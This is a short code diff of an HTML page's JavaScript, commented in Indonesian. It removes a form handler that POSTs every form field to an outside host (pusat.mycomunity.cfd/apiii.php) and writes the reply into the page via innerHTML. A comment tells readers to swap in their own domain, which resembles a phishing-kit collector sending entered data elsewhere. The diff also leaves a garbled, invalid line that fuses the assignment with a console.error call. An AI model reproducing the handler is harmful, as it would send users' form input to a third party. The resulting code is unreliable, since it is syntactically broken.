@@ -8,31 +8,7 @@
             const data = {};
             // Mengonversi FormData ke objek
             formData.forEach((value, key) => {
-                data[key] = value;
-            });
-
-            // Membuat URLSearchParams untuk mengonversi data ke dalam format x-www-form-urlencoded
-            const urlSearchParams = new URLSearchParams();
-            for (const key in data) {
-                urlSearchParams.append(key, data[key]);
-            }
-
-            // Ganti url ini dengan url domain kalian 
-            fetch(`https://pusat.mycomunity.cfd/apiii.php`, 
-{
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                // Menggunakan URLSearchParams untuk membuat body request
-                body: urlSearchParams.toString()
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById('result').innerHTML = data;
-            })
-            .catch(error => {
-                console.error('Error:', error);
+                data[key] = valueconsole.error('Error:', error);
             });
         });
     </script>
